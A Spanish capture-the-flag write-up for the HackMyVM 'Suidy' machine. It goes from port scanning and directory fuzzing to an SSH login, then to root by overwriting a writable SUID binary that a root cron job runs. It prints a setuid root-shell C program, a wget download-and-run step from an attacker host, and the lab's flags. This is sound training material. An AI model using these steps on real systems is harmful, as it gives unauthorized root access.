---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Suidy HackMyVM (Intermediate - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 03:22 EDT
Nmap scan report for 192.168.5.8
Host is up (0.00057s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 8a:cb:7e:8a:72:82:84:9a:11:43:61:15:c1:e6:32:0b (RSA)
|   256 7a:0e:b6:dd:8f:ee:a7:70:d9:b1:b5:6e:44:8f:c0:49 (ECDSA)
|_  256 80:18:e6:c7:01:0e:c6:6d:7d:f4:d2:9f:c9:d0:6f:4c (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:19:4F:BB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds
```

Veremos que hay un puerto `80` que aloja una pagina web, si entramos dentro solamente veremos un `hi` por lo que no veremos nada interesante, vamos a realizar un poco de `fuzzing` a ver que encontramos.

Si inspeccionamos el codigo veremos esto en el `HTML` pero nada fuera de lo normal.

```html
<!-- hi again -->
```

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.8/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 22]
/robots.txt           (Status: 200) [Size: 362]
Progress: 228894 / 882244 (25.94%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 229030 / 882244 (25.96%)
===============================================================
Finished
===============================================================
```

Veremos una cosa interesante, tiene un `robots.txt` por lo que vamos a investigar que contiene.

```
URL = http://<IP>/robots.txt
```

Info:

```
/hi
/....\..\.-\--.\.-\..\-.
```

Veremos lo que parece ser un codigo morse camuflado entre `/\`, vamos a quitarle dichas barras y ver que pone.

```
.... .. .- --. .- .. -.

#DECODIFICADO

hiagain
```

No veremos nada interesante de nuevo, pero si seguimos investigando en el `.txt` si bajamos abajo del todo, veremos esto:

```
/shehatesme
```

Probemos a entrar dentro, una vez dentro veremos esto:

```
She hates me because I FOUND THE REAL SECRET! I put in this directory a lot of .txt files. ONE of .txt files contains credentials like "theuser/thepass" to access to her system! All that you need is an small dict from Seclist!
```

Nos comenta que en este directorio se encuentras las credenciales de un usuario con dicho formato de contraseña, tambien esta hablando en femenino, por lo que puede ser que el usuario sea algun nombre en femenino.

## Escalate user theuser

```shell
gobuster dir -u http://<IP>/shehatesme -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.8/shehatesme
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 229]
/about.txt            (Status: 200) [Size: 16]
/search.txt           (Status: 200) [Size: 16]
/privacy.txt          (Status: 200) [Size: 16]
/blog.txt             (Status: 200) [Size: 16]
/new.txt              (Status: 200) [Size: 16]
/full.txt             (Status: 200) [Size: 16]
/page.txt             (Status: 200) [Size: 16]
/forums.txt           (Status: 200) [Size: 16]
/jobs.txt             (Status: 200) [Size: 16]
/other.txt            (Status: 200) [Size: 16]
/welcome.txt          (Status: 200) [Size: 16]
/admin.txt            (Status: 200) [Size: 16]
/faqs.txt             (Status: 200) [Size: 16]
/2001.txt             (Status: 200) [Size: 16]
/link.txt             (Status: 200) [Size: 16]
/space.txt            (Status: 200) [Size: 16]
/network.txt          (Status: 200) [Size: 16]
/google.txt           (Status: 200) [Size: 16]
/folder.txt           (Status: 200) [Size: 16]
/java.txt             (Status: 200) [Size: 16]
/issues.txt           (Status: 200) [Size: 16]
/guide.txt            (Status: 200) [Size: 16]
/es.txt               (Status: 200) [Size: 16]
/art.txt              (Status: 200) [Size: 16]
/smilies.txt          (Status: 200) [Size: 16]
/airport.txt          (Status: 200) [Size: 16]
/secret.txt           (Status: 200) [Size: 16]
/procps.txt           (Status: 200) [Size: 16]
/pynfo.txt            (Status: 200) [Size: 16]
/lh2.txt              (Status: 200) [Size: 16]
/muze.txt             (Status: 200) [Size: 16]
/alba.txt             (Status: 200) [Size: 16]
/cymru.txt            (Status: 200) [Size: 16]
/wha.txt              (Status: 200) [Size: 16]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos muchisimos archivos, pero solamente uno al que se refiera como un usuario femenino que seria el archivo llamado `alba.txt`, vamos a ver que vemos dentro de dicho archivo.

```
jaime11/JKiufg6
```

Vemos lo que parecen unas credenciales, si las probamos veremos que no nos sirve, por lo que vamos a probar directamente con las credenciales de ejemplo que nos esta mostrando en la pagina web.

```
User: theuser
Pass: thepass
```

### SSH

Vamos a conectarnos por `SSH` de la siguiente forma:

```shell
ssh theuser@<IP>
```

Metemos como contraseña `thepass` y veremos que estamos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
HMV2353IVI
```

## Escalate user suidy

Si listamos los permisos `SUID` que tenemos con dicho usuario veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
136287     20 -rwsrwsr-x   1 root     theuser     16704 sep 26  2020 /home/suidy/suidyyyyy
     3562     64 -rwsr-xr-x   1 root     root        63568 ene 10  2019 /usr/bin/su
     3890     36 -rwsr-xr-x   1 root     root        34888 ene 10  2019 /usr/bin/umount
     3888     52 -rwsr-xr-x   1 root     root        51280 ene 10  2019 /usr/bin/mount
       62     84 -rwsr-xr-x   1 root     root        84016 jul 27  2018 /usr/bin/gpasswd
       59     56 -rwsr-xr-x   1 root     root        54096 jul 27  2018 /usr/bin/chfn
     3415     44 -rwsr-xr-x   1 root     root        44440 jul 27  2018 /usr/bin/newgrp
       63     64 -rwsr-xr-x   1 root     root        63736 jul 27  2018 /usr/bin/passwd
       60     44 -rwsr-xr-x   1 root     root        44528 jul 27  2018 /usr/bin/chsh
    12498     52 -rwsr-xr--   1 root     messagebus    51184 jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    15846    428 -rwsr-xr-x   1 root     root         436552 ene 31  2020 /usr/lib/openssh/ssh-keysign
   137189     12 -rwsr-xr-x   1 root     root          10232 mar 28  2017 /usr/lib/eject/dmcrypt-get-device
```

Veremos este permiso de aqui bastante interesante:

```
136287  20 -rwsrwsr-x  1 root  theuser  16704 sep 26  2020 /home/suidy/suidyyyyy
```

Vamos a ejecutar el binario a ver que sucede para analizarlo:

```shell
./home/suidy/suidyyyyy
```

Info:

```
suidy@suidy:~$ whoami
suidy
```

Con esto veremos que ya seremos directamente el usuario `suidy` pero si investigamos mucho no vemos nada interesante con dicho usuario, pero si nos fijamos en los permisos del binario veremos lo siguiente:

```
-rwsrwsr-x 1 root theuser 16704 sep 26  2020 /home/suidy/suidyyyyy
```

Vemos que pertenece al grupo de `theuser` y que con dicho usuario podemos modificar el binario a nuestro gusto, vamos a comprobar que tengamos `gcc`:

```shell
gcc --version
```

Info:

```
gcc (Debian 8.3.0-6) 8.3.0
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
```

Vemos que si lo tenemos, ahora nos vamos a pasar el binario de `pspy64` para ver los procesos que se estan corriendo por dentro a nivel de sistema, para investigar un poco.

URL = [Download pspy64](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64)

> host

```shell
python3 -m http.server 80
```

> Maquina victima

```shell
cd /tmp
wget http://<IP_ATTACKER>/pspy64
```

Ahora lo ejecutaremos de la siguiente forma:

```shell
./pspy64
```

Info:

```
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/05/09 09:59:46 CMD: UID=1001  PID=835    | ./pspy64 
2025/05/09 09:59:46 CMD: UID=0     PID=834    | 
2025/05/09 09:59:46 CMD: UID=0     PID=817    | 
2025/05/09 09:59:46 CMD: UID=0     PID=782    | 
2025/05/09 09:59:46 CMD: UID=1001  PID=780    | /bin/bash 
2025/05/09 09:59:46 CMD: UID=1001  PID=779    | sh -c /bin/bash 
2025/05/09 09:59:46 CMD: UID=1001  PID=778    | /home/suidy/suidyyyyy 
2025/05/09 09:59:46 CMD: UID=0     PID=724    | 
2025/05/09 09:59:46 CMD: UID=1000  PID=719    | -bash 
2025/05/09 09:59:46 CMD: UID=1000  PID=718    | sshd: theuser@pts/0  
2025/05/09 09:59:46 CMD: UID=1000  PID=710    | (sd-pam) 
2025/05/09 09:59:46 CMD: UID=1000  PID=709    | /lib/systemd/systemd --user 
2025/05/09 09:59:46 CMD: UID=0     PID=706    | sshd: theuser [priv] 
2025/05/09 09:59:46 CMD: UID=33    PID=425    | nginx: worker process                            
2025/05/09 09:59:46 CMD: UID=0     PID=424    | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; 
2025/05/09 09:59:46 CMD: UID=0     PID=379    | /usr/sbin/sshd -D 
2025/05/09 09:59:46 CMD: UID=0     PID=376    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2025/05/09 09:59:46 CMD: UID=0     PID=375    | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3                                                                                                                         
2025/05/09 09:59:46 CMD: UID=0     PID=349    | /usr/sbin/rsyslogd -n -iNONE 
2025/05/09 09:59:46 CMD: UID=0     PID=342    | /lib/systemd/systemd-logind 
2025/05/09 09:59:46 CMD: UID=104   PID=341    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2025/05/09 09:59:46 CMD: UID=0     PID=340    | /usr/sbin/cron -f 
2025/05/09 09:59:46 CMD: UID=0     PID=282    | 
2025/05/09 09:59:46 CMD: UID=0     PID=278    | 
2025/05/09 09:59:46 CMD: UID=101   PID=255    | /lib/systemd/systemd-timesyncd 
2025/05/09 09:59:46 CMD: UID=0     PID=237    | /lib/systemd/systemd-udevd 
2025/05/09 09:59:46 CMD: UID=0     PID=215    | /lib/systemd/systemd-journald 
2025/05/09 09:59:46 CMD: UID=0     PID=185    | 
2025/05/09 09:59:46 CMD: UID=0     PID=184    | 
2025/05/09 09:59:46 CMD: UID=0     PID=182    | 
2025/05/09 09:59:46 CMD: UID=0     PID=151    | 
2025/05/09 09:59:46 CMD: UID=0     PID=109    | 
2025/05/09 09:59:46 CMD: UID=0     PID=107    | 
2025/05/09 09:59:46 CMD: UID=0     PID=106    | 
2025/05/09 09:59:46 CMD: UID=0     PID=104    | 
2025/05/09 09:59:46 CMD: UID=0     PID=102    | 
2025/05/09 09:59:46 CMD: UID=0     PID=59     | 
2025/05/09 09:59:46 CMD: UID=0     PID=50     | 
2025/05/09 09:59:46 CMD: UID=0     PID=49     | 
2025/05/09 09:59:46 CMD: UID=0     PID=48     | 
2025/05/09 09:59:46 CMD: UID=0     PID=30     | 
2025/05/09 09:59:46 CMD: UID=0     PID=29     | 
2025/05/09 09:59:46 CMD: UID=0     PID=28     | 
2025/05/09 09:59:46 CMD: UID=0     PID=27     | 
2025/05/09 09:59:46 CMD: UID=0     PID=26     | 
2025/05/09 09:59:46 CMD: UID=0     PID=25     | 
2025/05/09 09:59:46 CMD: UID=0     PID=24     | 
2025/05/09 09:59:46 CMD: UID=0     PID=23     | 
2025/05/09 09:59:46 CMD: UID=0     PID=22     | 
2025/05/09 09:59:46 CMD: UID=0     PID=21     | 
2025/05/09 09:59:46 CMD: UID=0     PID=20     | 
2025/05/09 09:59:46 CMD: UID=0     PID=19     | 
2025/05/09 09:59:46 CMD: UID=0     PID=18     | 
2025/05/09 09:59:46 CMD: UID=0     PID=17     | 
2025/05/09 09:59:46 CMD: UID=0     PID=16     | 
2025/05/09 09:59:46 CMD: UID=0     PID=15     | 
2025/05/09 09:59:46 CMD: UID=0     PID=14     | 
2025/05/09 09:59:46 CMD: UID=0     PID=12     | 
2025/05/09 09:59:46 CMD: UID=0     PID=11     | 
2025/05/09 09:59:46 CMD: UID=0     PID=10     | 
2025/05/09 09:59:46 CMD: UID=0     PID=9      | 
2025/05/09 09:59:46 CMD: UID=0     PID=8      | 
2025/05/09 09:59:46 CMD: UID=0     PID=7      | 
2025/05/09 09:59:46 CMD: UID=0     PID=6      | 
2025/05/09 09:59:46 CMD: UID=0     PID=4      | 
2025/05/09 09:59:46 CMD: UID=0     PID=3      | 
2025/05/09 09:59:46 CMD: UID=0     PID=2      | 
2025/05/09 09:59:46 CMD: UID=0     PID=1      | /sbin/init
2025/05/09 10:00:01 CMD: UID=0     PID=843    | /usr/sbin/CRON -f 
2025/05/09 10:00:01 CMD: UID=0     PID=844    | /usr/sbin/CRON -f 
2025/05/09 10:00:01 CMD: UID=0     PID=845    | /bin/sh -c sh /root/timer.sh 
2025/05/09 10:00:01 CMD: UID=0     PID=846    | sh /root/timer.sh
```

Vemos que se esta ejecutando un `crontab` como el usuario `root` en este caso con el script llamado `timer.sh` el cual podemos creer que puede estar ejecutando el binario llamado `suidyyyyy` el cual podemos modificar, por lo que vamos a realizar lo siguiente a ver si funciona.

Vamos a crear un binario y compilarlo en la maquina victima.

> suid.c

```c
#include <stdlib.h>
#include <unistd.h>

int main()
{
   setuid(0);
   setgid(0);
   system("/bin/bash");
   return 0;
}
```

Ahora lo compilamos de la siguiente forma en la `home` de `suidy`.

```shell
exit # Para volver al usuario de "theuser"
cd /tmp
gcc /tmp/suid.c -o suidyyyyy
cp suidyyyyy /home/suidy/suidyyyyy
```

Ahora tendremos que esperar un poco, una vez esperado un poco ejecutaremos lo siguiente:

```shell
/home/suidy/suidyyyyy
```

Info:

```
root@suidy:/home/suidy# whoami
root
```

Y con esto veremos que seremos `root` por lo que leeremos la `flag` de `root`.

> root.txt

```
HMV0000EVE
```
